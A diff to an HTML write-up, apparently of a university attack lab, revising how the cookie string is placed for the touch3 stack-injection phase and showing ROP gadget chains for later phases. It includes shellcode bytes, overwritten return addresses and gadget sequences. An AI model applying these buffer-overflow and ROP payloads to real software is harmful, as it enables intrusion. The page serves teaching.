@@ -858,8 +858,8 @@
 </span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>bytes 40-47: 78 dc 61 55 00 00 00 00             (-&gt; 0x5561dc78 = buffer)
 </span></code></pre></div>
 <h2 id="phase-3-pass-a-string-to-touch3">Phase 3 · pass a string to touch3<a class="headerlink" href="#phase-3-pass-a-string-to-touch3" title="Permanent link">¶</a></h2>
-<p><code>touch3</code> wants <code>%rdi</code> to point at the <strong>ASCII</strong> cookie, <code>"59b997fa"</code>. The only real question is <em>where</em> to stash that string — because <code>touch3</code> calls <code>hexmatch</code>, which allocates a scratch buffer and <code>sprintf</code>s onto the stack, and those writes can trample bytes left lying in the old <code>getbuf</code> frame. Wherever the string goes, <code>%edi</code> just has to point at it. Two placements both work.</p>
-<p><strong>A · after the return address</strong> — put the string at <code>buffer + 0x30 = 0x5561dca8</code>, <em>above</em> the return slot. The stack grows <strong>downward</strong> from there, so <code>touch3</code>/<code>hexmatch</code> never write over it — the defensive choice:</p>
+<p><code>touch3</code> wants <code>%rdi</code> to point at the <strong>ASCII</strong> cookie, <code>"59b997fa"</code>. The string cannot stay inside the old <code>getbuf</code> buffer: <code>touch3</code> calls <code>hexmatch</code>, whose stack frame reuses that region. The submitted payload therefore places the string <strong>after the overwritten return address</strong>, at <code>buffer + 0x30 = 0x5561dca8</code>, and points <code>%edi</code> there.</p>
+<p>Because the stack grows downward, <code>touch3</code> and <code>hexmatch</code> build their frames at lower addresses. The cookie at <code>buf + 0x30</code> stays above those writes:</p>
 <div class="language-asm highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nf">movl</span><span class="w"> </span><span class="no">$0x5561dca8</span><span class="p">,</span><span class="w"> </span><span class="nv">%edi</span><span class="w">     </span><span class="c1">; string at buffer + 0x30</span>
 </span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="nf">push</span><span class="w"> </span><span class="no">$0x4018fa</span><span class="w">             </span><span class="c1">; touch3</span>
 </span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="nf">ret</span>
@@ -868,26 +868,14 @@
 </span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>bytes 40-47: 78 dc 61 55 ...                        (return into the buffer, runs the code)
 </span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>bytes 48-56: 35 39 62 39 39 37 66 61 00           (&quot;59b997fa\0&quot; at 0x5561dca8)
 </span></code></pre></div>
-<p><strong>B · right after the shellcode</strong> — the string is only 9 bytes and the injected code only 11, so it also fits <em>inside</em> the buffer, tucked immediately after the code at <code>buffer + 0x0b = 0x5561dc83</code>:</p>
-<div class="language-asm highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nf">movl</span><span class="w"> </span><span class="no">$0x5561dc83</span><span class="p">,</span><span class="w"> </span><span class="nv">%edi</span><span class="w">     </span><span class="c1">; string at buffer + 0x0b, just past the code</span>
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="nf">push</span><span class="w"> </span><span class="no">$0x4018fa</span><span class="w">             </span><span class="c1">; touch3</span>
-</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="nf">ret</span>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>   high addresses
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>     buf+0x30   &quot;59b997fa\0&quot;                 &lt;- %rsp on entry to touch3
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>   --------------------------------------
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>     buf+0x28   overwritten return address
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>     buf+0x00   getbuf&#39;s old buffer          &lt;- reused by deeper stack frames
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>   low addresses
 </span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>bytes 0-10 : bf 83 dc 61 55 68 fa 18 40 00 c3    (shellcode -&gt; %edi = 0x5561dc83)
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>bytes 11-19: 35 39 62 39 39 37 66 61 00           (&quot;59b997fa\0&quot; right after the code)
-</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>bytes 20-39: 90 ...                                 (padding)
-</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>bytes 40-47: 78 dc 61 55 ...                        (return into the buffer)
-</span></code></pre></div>
-<p>Once <code>touch3</code> runs, <code>%rsp = buf + 0x30</code>, and <code>hexmatch</code> writes a scratch buffer <em>below</em> that (toward lower addresses). That is what separates the two placements:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>   high addresses
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>     buf+0x30   placement A  (&quot;59b997fa&quot;)     above %rsp, never clobbered   SAFE
-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>   --------------------------------------     &lt;- %rsp on entry to touch3
-</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>     buf+0x28   old return slot               below %rsp: hexmatch writes
-</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>     buf+0x0b   placement B  (&quot;59b997fa&quot;)     its scratch frame down here,
-</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>     buf+0x00   getbuf&#39;s buffer               so B may be clobbered       RISKY
-</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>   low addresses
-</span></code></pre></div>
-<p>Layout <strong>B</strong> is more compact but sits in that write zone, so it only works because <code>hexmatch</code>'s frame happens not to reach <code>0x5561dc83</code>. Layout <strong>A</strong>, above the return address, is safe by construction. Either way the payload is the cookie string <strong><code>59b997fa</code></strong> at whatever address <code>%edi</code> holds.</p>
+<p>This matches <code>phase3.txt</code>: the shellcode occupies the start of the buffer, the saved return address points back to that shellcode, and the cookie string <strong><code>59b997fa</code></strong> follows the return slot where nested calls cannot clobber it.</p>
 <hr />
 <h2 id="turning-to-rtarget-why-injection-stops-working">Turning to rtarget: why injection stops working<a class="headerlink" href="#turning-to-rtarget-why-injection-stops-working" title="Permanent link">¶</a></h2>
 <p><code>rtarget</code> closes both doors the first three phases walked through:</p>
@@ -923,10 +911,10 @@
 </tbody>
 </table>
 <p>The chain lays the cookie <em>between</em> the two gadget addresses, so the <code>pop</code> scoops it up:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>bytes 40-47: cc 19 40 00 ...     (-&gt; pop %rax)
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>bytes 48-55: fa 97 b9 59 ...     (the cookie, popped into %rax)
-</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>bytes 56-63: a2 19 40 00 ...     (-&gt; mov %rax,%rdi)
-</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>bytes 64-71: ec 17 40 00 ...     (-&gt; touch2)
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>bytes 40-47: cc 19 40 00 ...     (-&gt; pop %rax)
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>bytes 48-55: fa 97 b9 59 ...     (the cookie, popped into %rax)
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>bytes 56-63: a2 19 40 00 ...     (-&gt; mov %rax,%rdi)
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>bytes 64-71: ec 17 40 00 ...     (-&gt; touch2)
 </span></code></pre></div>
 <h2 id="phase-5-computing-a-stack-address-at-runtime">Phase 5 · computing a stack address at runtime<a class="headerlink" href="#phase-5-computing-a-stack-address-at-runtime" title="Permanent link">¶</a></h2>
 <p>Phase 3's problem returns, now under ASLR: <code>touch3</code> needs <code>%rdi</code> pointing at the cookie string, but we no longer know any stack address. The way out is to <strong>read <code>%rsp</code> at runtime</strong> and add a known offset to it. The string is planted at the very end of the chain, and its distance from a captured <code>%rsp</code> is a constant — here <code>0x48</code>:</p>
@@ -997,16 +985,16 @@
 </tbody>
 </table>
 <p>Why the register relay in steps 4-6? The farm offers no direct <code>pop</code>/<code>mov</code> into <code>%rsi</code>, so the offset is walked <code>%eax -&gt; %edx -&gt; %ecx -&gt; %esi</code> through the gadgets that <em>do</em> exist. The offset is exact: gadget 1 captures <code>%rsp</code> pointing at the chain's continuation (<code>buf + 0x30</code>), and the string is planted <code>0x48</code> bytes further along:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>   Deriving the 0x48 offset  (byte offsets from the start of buf):
-</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>
-</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>     0x28   gadget 1: mov %rsp,%rax     getbuf returns into gadget 1
-</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>     0x30   gadget 2: mov %rax,%rdi     &lt;- %rsp is HERE when gadget 1 runs,
-</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>     0x38   gadget 3: pop %rax             so it captures  buf + 0x30
-</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>     0x40   0x48  (the offset)          popped, then relayed into %rsi
-</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>      ..    lea (%rdi,%rsi) -&gt; %rax = (buf + 0x30) + 0x48 = buf + 0x78
-</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>     0x78   &quot;59b997fa&quot;                  the string sits here
-</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>
-</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>     offset = string(0x78) - captured %rsp(0x30) = 0x48
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>   Deriving the 0x48 offset  (byte offsets from the start of buf):
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>     0x28   gadget 1: mov %rsp,%rax     getbuf returns into gadget 1
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>     0x30   gadget 2: mov %rax,%rdi     &lt;- %rsp is HERE when gadget 1 runs,
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>     0x38   gadget 3: pop %rax             so it captures  buf + 0x30
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>     0x40   0x48  (the offset)          popped, then relayed into %rsi
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>      ..    lea (%rdi,%rsi) -&gt; %rax = (buf + 0x30) + 0x48 = buf + 0x78
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>     0x78   &quot;59b997fa&quot;                  the string sits here
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>
+</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>     offset = string(0x78) - captured %rsp(0x30) = 0x48
 </span></code></pre></div>
 <p>That is ROP in a nutshell: with no new code and no fixed addresses, a carefully ordered stack of pointers still computes exactly what the attacker needs.</p>
 
